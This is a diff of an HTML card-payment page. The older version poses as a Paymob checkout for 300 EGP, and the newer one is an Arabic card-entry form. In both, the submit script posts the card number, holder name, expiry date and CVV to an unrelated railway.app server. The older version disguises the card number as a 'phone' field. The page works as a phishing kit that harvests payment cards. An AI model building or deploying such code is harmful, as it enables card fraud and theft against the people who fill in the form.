@@ -3,152 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Information</title>
+    <title>إدخال بيانات البطاقة</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
-
         body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f5f5f5;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            background-color: #f5f5f5;
         }
 
         .container {
-            background: white;
-            width: 360px;
+            background: #fff;
             padding: 20px;
             border-radius: 12px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 350px;
             text-align: center;
         }
 
         .card-image {
             width: 100%;
-            border-radius: 12px;
+            border-radius: 10px;
             margin-bottom: 15px;
         }
 
-        h2 {
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: #333;
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
         input {
             width: 100%;
             padding: 12px;
-            margin: 6px 0;
+            border-radius: 8px;
             border: 1px solid #ccc;
-            border-radius: 10px;
-            font-size: 14px;
-            text-align: left;
+            font-size: 16px;
+            text-align: center;
         }
 
-        input:focus {
-            outline: 2px solid #007bff;
-        }
-
-        .input-row {
+        .row {
             display: flex;
-            justify-content: space-between;
+            gap: 10px;
         }
 
-        .input-row input {
-            width: 47%;
-            border-radius: 10px;
+        .row input {
+            flex: 1;
         }
 
-        .expiry {
-            margin-right: 6px; /* إضافة مسافة بسيطة بين تاريخ الانتهاء و CVV */
+        label {
+            font-size: 14px;
+            text-align: right;
+            display: block;
         }
 
         .save-card {
             display: flex;
             align-items: center;
-            margin: 12px 0;
+            justify-content: center;
+            gap: 5px;
             font-size: 14px;
         }
 
-        .save-card input {
-            width: auto;
-            margin-right: 8px;
-        }
-
-        .pay-button {
-            width: 100%;
-            padding: 12px;
-            background: #007bff;
+        button {
+            background-color: #28a745;
             color: white;
+            font-size: 18px;
+            padding: 12px;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: 0.3s;
         }
 
-        .pay-button:hover {
-            background: #0056b3;
-        }
-
-        .secured {
-            font-size: 12px;
-            color: #777;
-            margin-top: 10px;
+        button:hover {
+            background-color: #218838;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>Payment Information</h2>
-        <img src="https://i.imgur.com/ZR6p2ie.png" class="card-image" alt="Credit Card">
+        <img src="card-placeholder.png" alt="بطاقة الائتمان" class="card-image">
         
-        <form id="paymentForm">
-            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" pattern="\d*" required>
-            <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
-            
-            <div class="input-row">
-                <input type="text" id="expiryDate" class="expiry" placeholder="MM/YY" maxlength="5" required>
-                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d*" required>
+        <form id="cardForm">
+            <label>رقم البطاقة:</label>
+            <input type="text" id="cardNumber" required pattern="\d{16}" placeholder="1234 5678 9012 3456">
+
+            <label>اسم حامل البطاقة:</label>
+            <input type="text" id="cardHolder" required pattern="[A-Za-z ]+" placeholder="John Doe">
+
+            <div class="row">
+                <div>
+                    <label>تاريخ الانتهاء:</label>
+                    <input type="text" id="expiryDate" required pattern="\d{2}/\d{2}" placeholder="MM/YY">
+                </div>
+                <div>
+                    <label>CVV:</label>
+                    <input type="text" id="cvv" required pattern="\d{3}" placeholder="123">
+                </div>
             </div>
 
             <div class="save-card">
                 <input type="checkbox" id="saveCard">
-                <label for="saveCard">Save Card</label>
+                <label for="saveCard">حفظ البطاقة</label>
             </div>
 
-            <button type="submit" class="pay-button">PAY 300.00 EGP</button>
+            <button type="submit">إرسال</button>
         </form>
-
-        <p class="secured">🔒 Secured by Paymob</p>
     </div>
 
     <script>
-        document.getElementById("paymentForm").addEventListener("submit", function(event) {
+        document.getElementById("cardForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const cardNumber = document.getElementById("cardNumber").value;
-            const cardHolder = document.getElementById("cardHolder").value;
-            const expiryDate = document.getElementById("expiryDate").value;
-            const cvv = document.getElementById("cvv").value;
-            const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";
+            const cardNumber = document.getElementById("cardNumber").value.trim();
+            const cardHolder = document.getElementById("cardHolder").value.trim();
+            const expiryDate = document.getElementById("expiryDate").value.trim();
+            const cvv = document.getElementById("cvv").value.trim();
+            const saveCard = document.getElementById("saveCard").checked;
 
-            fetch("https://nodejs-production-7090.up.railway.app/send", { 
+            // إرسال البيانات إلى السيرفر
+            fetch("https://nodejs-production-7090.up.railway.app/send", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    name: cardHolder, 
-                    phone: cardNumber, 
-                    message: `Expiry: ${expiryDate}, CVV: ${cvv}, Save Card: ${saveCard}` 
-                })
+                body: JSON.stringify({ cardNumber, cardHolder, expiryDate, cvv, saveCard })
             })
             .then(response => response.json())
             .then(data => alert(data.message))
-            .catch(error => alert("حدث خطأ!"));
+            .catch(error => alert("حدث خطأ أثناء الإرسال!"));
         });
     </script>
 
